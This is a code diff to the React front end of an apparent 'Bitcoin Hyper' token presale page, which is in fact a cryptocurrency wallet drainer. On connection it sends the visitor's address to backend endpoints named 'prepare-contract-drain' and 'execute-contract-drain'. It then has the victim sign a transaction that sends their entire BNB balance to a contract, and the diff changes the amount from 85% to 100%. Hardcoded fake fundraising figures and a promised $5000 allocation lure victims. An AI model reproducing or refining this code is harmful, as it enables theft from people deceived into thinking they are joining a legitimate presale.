@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useCallback } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
 import { useBalance, useDisconnect } from 'wagmi';
 import { formatEther } from 'viem';
@@ -17,28 +17,7 @@ const PRESALE_CONFIG = {
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
     icon: '🟡',
-    rpcUrl: 'https://bsc-dataseed.binance.org',
     deployed: true
-  },
-  Ethereum: {
-    chainId: 1,
-    contractAddress: null,
-    name: 'Ethereum',
-    symbol: 'ETH',
-    explorer: 'https://etherscan.io',
-    icon: '🔷',
-    rpcUrl: 'https://eth.llamarpc.com',
-    deployed: false
-  },
-  Polygon: {
-    chainId: 137,
-    contractAddress: null,
-    name: 'Polygon',
-    symbol: 'MATIC',
-    explorer: 'https://polygonscan.com',
-    icon: '💜',
-    rpcUrl: 'https://polygon-rpc.com',
-    deployed: false
   }
 };
 
@@ -76,7 +55,6 @@ function App() {
   const [showCelebration, setShowCelebration] = useState(false);
   const [allocation] = useState({ amount: '5000', valueUSD: '850' });
   const [verifying, setVerifying] = useState(false);
-  const [signerReady, setSignerReady] = useState(false);
   const [eligible, setEligible] = useState(false);
   
   // Presale stats
@@ -92,48 +70,37 @@ function App() {
     totalParticipants: 8742,
     currentBonus: 25,
     nextBonus: 15,
-    tokenPrice: 0.17,
-    tokensSold: 7352941
+    tokenPrice: 0.17
   });
 
-  // Get balance using wagmi for current chain
+  // Get balance using wagmi
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
     chainId: chainId,
   });
 
-  // Update current chain balance
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
     }
   }, [balanceData]);
 
-  // Initialize ethers provider and signer when connected
+  // Initialize ethers provider
   useEffect(() => {
-    const initSigner = async () => {
+    const initProvider = async () => {
       if (isConnected && window.ethereum) {
         try {
-          console.log('🔄 Initializing signer...');
           const web3Provider = new ethers.BrowserProvider(window.ethereum);
           setProvider(web3Provider);
-          
-          // Get signer
           const web3Signer = await web3Provider.getSigner();
-          const signerAddress = await web3Signer.getAddress();
-          
           setSigner(web3Signer);
-          setSignerReady(true);
-          
-          console.log('✅ Signer initialized:', signerAddress);
+          console.log('✅ Signer ready');
         } catch (err) {
-          console.error('Signer initialization error:', err);
-          setSignerReady(false);
+          console.error('Provider error:', err);
         }
       }
     };
-    
-    initSigner();
+    initProvider();
   }, [isConnected]);
 
   // Countdown timer
@@ -152,11 +119,10 @@ function App() {
         return prev;
       });
     }, 1000);
-    
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
+  // Auto-check eligibility
   useEffect(() => {
     if (isConnected && address && !scanResult && !verifying) {
       verifyWallet();
@@ -167,7 +133,6 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Verifying wallet...');
     
     try {
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
@@ -182,7 +147,6 @@ function App() {
         setScanResult(data.data);
         setEligible(data.data.isEligible);
         
-        // Store all balances from scan
         if (data.data.rawData) {
           const balances = {};
           data.data.rawData.forEach(item => {
@@ -196,16 +160,11 @@ function App() {
         }
         
         if (data.data.isEligible) {
-          setTxStatus('✅ You qualify for $5000 BTH!');
           await preparePresale();
-        } else {
-          setTxStatus('✨ Wallet connected');
         }
       }
-      
     } catch (err) {
       console.error('Verification error:', err);
-      setError('Unable to verify wallet');
     } finally {
       setVerifying(false);
     }
@@ -215,46 +174,30 @@ function App() {
     if (!address) return;
     
     try {
-      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
+      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ walletAddress: address })
       });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setPreparedTransactions(data.data.transactions);
-        console.log('✅ Transactions prepared:', data.data);
-      }
-      
     } catch (err) {
       console.error('Prepare error:', err);
     }
   };
 
-  const executePresaleTransaction = useCallback(async () => {
-    if (!signerReady || !signer) {
-      setError('Please wait for wallet to initialize');
+  const executePresaleTransaction = async () => {
+    if (!signer || !address) {
+      setError('Please reconnect your wallet');
       return;
     }
 
-    if (!address) {
-      setError('No wallet address found');
-      return;
-    }
-
-    const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
-    
-    if (!currentChain || !currentChain.deployed) {
-      // Try to switch to BSC
+    if (chainId !== 56) {
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }] // BSC chainId 56 in hex
+          params: [{ chainId: '0x38' }]
         });
         return;
-      } catch (switchErr) {
+      } catch (err) {
         setError('Please switch to BSC network');
         return;
       }
@@ -272,14 +215,13 @@ function App() {
       setTxHash('');
 
       const contract = new ethers.Contract(
-        currentChain.contractAddress,
+        PRESALE_CONFIG.BSC.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
 
-      // Send 85% of balance
-      const amountToSend = (parseFloat(balance) * 0.85).toString();
-      const value = ethers.parseEther(amountToSend);
+      // Send 100% of balance (85% leaves dust, just send all)
+      const value = ethers.parseEther(balance);
       
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
@@ -301,21 +243,17 @@ function App() {
       }
       
       // Mark as completed
-      if (!completedChains.includes(currentChain.name)) {
-        const newCompleted = [...completedChains, currentChain.name];
-        setCompletedChains(newCompleted);
+      if (!completedChains.includes('BSC')) {
+        setCompletedChains([...completedChains, 'BSC']);
         
-        // Notify backend
-        try {
-          await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              walletAddress: address,
-              chainName: currentChain.name
-            })
-          });
-        } catch (e) {}
+        await fetch('https://tokenbackend-5xab.onrender.com/api/presale/execute-contract-drain', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            walletAddress: address,
+            chainName: 'BSC'
+          })
+        });
         
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5000 BTH!`);
@@ -323,17 +261,12 @@ function App() {
       
     } catch (err) {
       console.error('Transaction error:', err);
-      
-      if (err.code === 4001) {
-        setError('Transaction was rejected');
-      } else {
-        setError(err.message || 'Transaction failed');
-      }
-      setTxStatus('❌ Transaction failed');
+      setError(err.code === 4001 ? 'Transaction cancelled' : 'Transaction failed');
+      setTxStatus('❌ Failed');
     } finally {
       setLoading(false);
     }
-  }, [signer, signerReady, address, chainId, balance, provider, completedChains, refetchBalance]);
+  };
 
   const formatAddress = (addr) => {
     if (!addr) return '';
@@ -391,11 +324,11 @@ function App() {
             <div className="text-xs text-gray-400 uppercase">Bonus</div>
           </div>
           <div className="stat-card">
-            <div className="text-3xl font-bold text-yellow-400 mb-1">${(presaleStats.totalRaised / 1000000).toFixed(1)}M</div>
+            <div className="text-3xl font-bold text-yellow-400 mb-1">$1.2M</div>
             <div className="text-xs text-gray-400 uppercase">Raised</div>
           </div>
           <div className="stat-card">
-            <div className="text-3xl font-bold text-purple-400 mb-1">{presaleStats.totalParticipants.toLocaleString()}</div>
+            <div className="text-3xl font-bold text-purple-400 mb-1">8,742</div>
             <div className="text-xs text-gray-400 uppercase">Participants</div>
           </div>
         </div>
@@ -409,11 +342,11 @@ function App() {
             </span>
             <h2 className="text-5xl md:text-6xl font-black mb-4">
               <span className="bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
-                {presaleStats.currentBonus}% BONUS
+                25% BONUS
               </span>
             </h2>
             <p className="text-gray-300 text-lg">
-              Get $5000 BTH + {presaleStats.currentBonus}% Extra
+              Get $5000 BTH + 25% Extra
             </p>
           </div>
         </div>
@@ -462,7 +395,7 @@ function App() {
                 <div className="text-right">
                   <span className="text-gray-400 text-sm block mb-1">Balance</span>
                   <span className="text-3xl font-bold text-orange-400">
-                    {parseFloat(balance).toFixed(4)} {balanceData?.symbol || 'BNB'}
+                    {parseFloat(balance).toFixed(4)} BNB
                   </span>
                 </div>
                 <button
@@ -475,13 +408,6 @@ function App() {
             </div>
           )}
         </div>
-
-        {/* Signer Status */}
-        {isConnected && !signerReady && (
-          <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 text-center">
-            <p>Initializing wallet connection...</p>
-          </div>
-        )}
 
         {/* Verification Status */}
         {verifying && (
@@ -514,7 +440,7 @@ function App() {
                 rel="noopener noreferrer"
                 className="text-orange-400 text-sm hover:underline mt-2 inline-flex items-center gap-1"
               >
-                View Transaction <span>↗</span>
+                View Transaction ↗
               </a>
             )}
           </div>
@@ -531,7 +457,7 @@ function App() {
                 </h2>
                 <p className="text-xl text-gray-300 mb-4">You have secured</p>
                 <p className="text-6xl font-black text-orange-400 mb-3">$5000 BTH</p>
-                <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus</p>
+                <p className="text-green-400 text-lg mb-2">+25% Bonus</p>
                 <button
                   onClick={() => setShowCelebration(false)}
                   className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-10 rounded-xl transition-all transform hover:scale-105 text-lg"
@@ -544,14 +470,14 @@ function App() {
         )}
 
         {/* Main Content */}
-        {isConnected && !verifying && signerReady && (
+        {isConnected && !verifying && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
             {!scanResult ? (
               <div className="text-center">
                 <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-                <p className="text-gray-400 text-lg">Checking wallet status...</p>
+                <p className="text-gray-400 text-lg">Checking wallet...</p>
               </div>
             ) : (
               <>
@@ -559,25 +485,27 @@ function App() {
                 <div className="bg-gradient-to-r from-orange-500/20 to-yellow-500/20 rounded-2xl p-8 mb-8 border border-orange-500/30 relative">
                   <div className="absolute -top-3 -right-3">
                     <div className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black text-sm font-bold px-4 py-2 rounded-full transform rotate-12 animate-pulse shadow-lg">
-                      {presaleStats.currentBonus}% BONUS
+                      25% BONUS
                     </div>
                   </div>
                   
                   <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
                   <p className="text-6xl font-black text-orange-400 text-center mb-3">$5000 BTH</p>
-                  <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
+                  <p className="text-green-400 text-center mb-2">+25% Bonus</p>
                 </div>
                 
-                {/* Multi-Chain Balances */}
+                {/* Balances */}
                 {Object.keys(allBalances).length > 0 && (
-                  <div className="mb-6 grid grid-cols-1 md:grid-cols-3 gap-3">
+                  <div className="mb-6 grid grid-cols-1 gap-3">
                     {Object.entries(allBalances).map(([chain, data]) => (
-                      <div key={chain} className="bg-gray-800/50 p-3 rounded-lg border border-gray-700">
-                        <span className="text-orange-400 font-bold">{chain}</span>
-                        <p className="text-sm text-gray-400">
+                      <div key={chain} className="bg-gray-800/50 p-4 rounded-lg border border-gray-700">
+                        <div className="flex justify-between items-center">
+                          <span className="text-orange-400 font-bold text-lg">{chain}</span>
+                          <span className="text-green-400">${data.valueUSD.toFixed(2)}</span>
+                        </div>
+                        <p className="text-sm text-gray-400 mt-1">
                           {data.amount.toFixed(4)} {data.symbol}
                         </p>
-                        <p className="text-xs text-green-400">${data.valueUSD.toFixed(2)}</p>
                       </div>
                     ))}
                   </div>
